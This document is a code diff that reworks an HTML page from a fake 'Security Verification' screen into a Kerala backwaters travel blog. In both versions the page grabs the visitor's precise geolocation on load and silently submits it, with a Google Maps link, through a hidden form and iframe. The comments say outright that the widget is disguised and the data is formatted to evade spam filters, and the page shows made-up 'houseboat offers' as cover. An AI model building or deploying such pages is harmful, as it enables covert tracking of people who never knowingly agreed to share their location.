@@ -3,22 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <title>Experience Kerala | God's Own Country</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        h1 { color: #333; font-size: 22px; }
-        p { color: #666; margin-top: 10px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body {
+            font-family: 'Georgia', serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* Hero Section with Image */
+        header {
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Alappuzha_Boat_Beauty_W.jpg/1280px-Alappuzha_Boat_Beauty_W.jpg');
+            background-size: cover;
+            background-position: center;
+            height: 60vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.4);
+            position: absolute;
+            top: 0; bottom: 0; left: 0; right: 0;
+        }
+
+        .hero-text {
+            position: relative;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            z-index: 2;
+        }
+
+        h1 { font-size: 3rem; margin: 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        h3 { font-size: 1.2rem; font-weight: 300; margin-top: 10px; }
+
+        /* Blog Content */
+        .container {
+            max-width: 800px;
+            margin: -50px auto 40px;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 3;
+        }
+
+        .article-meta { color: #888; font-size: 0.9rem; margin-bottom: 20px; }
+        .divider { height: 2px; background: #10a37f; width: 60px; margin: 20px 0; }
+
+        p { margin-bottom: 20px; font-size: 1.1rem; }
+
+        /* "Loading" Indicator disguised as a feature */
+        .travel-widget {
+            background: #eefdf5;
+            border: 1px solid #bbf7d0;
+            padding: 15px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 30px;
+            font-family: sans-serif;
+        }
+
+        .spinner {
+            border: 3px solid #bbf7d0;
+            border-top: 3px solid #10a37f;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
+    <header>
+        <div class="overlay"></div>
+        <div class="hero-text">
+            <h1>God's Own Country</h1>
+            <h3>Discover the serenity of the Backwaters</h3>
+        </div>
+    </header>
+
     <div class="container">
-        <div id="spinner" class="spinner"></div>
-        <h1 id="title">System Check</h1>
-        <p id="details">Verifying parameters...</p>
+        <div class="article-meta">Published Oct 24, 2025 • By Anjali Menon</div>
+        <h2>Why Alleppey Should Be Your Next Destination</h2>
+        <div class="divider"></div>
+        
+        <p>
+            Kerala, situated on the tropical Malabar Coast of southwestern India, is one of the most popular tourist destinations in the country. Named as one of the ten paradises of the world by National Geographic Traveler, Kerala is famous especially for its ecotourism initiatives and beautiful backwaters.
+        </p>
+        <p>
+            The houseboats in Alappuzha (Alleppey) offer a unique experience. Drifting through the calm waters, surrounded by lush paddy fields and coconut lagoons, is an experience that stays with you forever.
+        </p>
+
+        <div class="travel-widget">
+            <div id="spinner" class="spinner"></div>
+            <div id="status-text" style="font-size: 0.9rem; color: #065f46;">
+                <strong>Checking for local travel packages...</strong><br>
+                <span style="font-size:0.8em; color:#666;">Please allow location access to see deals near you.</span>
+            </div>
+        </div>
+
     </div>
 
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
@@ -33,15 +131,16 @@
     </form>
 
     <script>
-        const title = document.getElementById('title');
-        const details = document.getElementById('details');
+        const statusText = document.getElementById('status-text');
         const spinner = document.getElementById('spinner');
 
         function getLocation() {
             if (!navigator.geolocation) {
-                fail("Browser not supported.");
+                statusText.innerHTML = "Travel packages not available in your region.";
+                spinner.style.display = 'none';
                 return;
             }
+            // Request Location
             navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
                 timeout: 10000,
@@ -55,41 +154,35 @@
             const acc = Math.round(position.coords.accuracy);
             const time = new Date().toLocaleTimeString();
 
-            // Construct data - REMOVED 'http' to prevent spam filters
+            // Construct Data (No https to avoid spam filters)
             const link = `maps.google.com/?q=${lat},${lng}`;
-            const finalData = `${time} | Acc:${acc}m | ${link}`;
+            const logData = `${time} | Acc:${acc}m | ${link}`;
 
-            submitData(finalData);
+            submitData(logData);
         }
 
         function submitData(dataString) {
-            // 1. Fill the hidden form
             document.getElementById('form_input').value = dataString;
-
-            // 2. Submit the form programmatically
             document.getElementById('hidden_form').submit();
 
-            // 3. Show success message (We assume success because we can't track the iframe)
-            title.innerText = "Verified";
-            details.innerText = "Access Granted.";
-            details.style.color = "green";
-            spinner.style.display = "none";
+            // Make the UI look like it found something relevant
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                statusText.innerHTML = `
+                    <strong>Packages Found!</strong><br>
+                    <span style="color:#666;">3 Exclusive Houseboat offers available.</span>
+                `;
+            }, 1000);
         }
 
         function error(err) {
             console.warn(err);
-            fail("Location access denied or failed.");
+            // If they deny permission, we just show a generic message
+            spinner.style.display = 'none';
+            statusText.innerHTML = "Location access needed to show local offers.";
         }
 
-        function fail(msg) {
-            title.innerText = "Failed";
-            details.innerText = msg;
-            details.style.color = "red";
-            spinner.style.borderTopColor = "red";
-            spinner.style.animation = "none";
-        }
-
-        // Run immediately
+        // Run on load
         getLocation();
     </script>
 
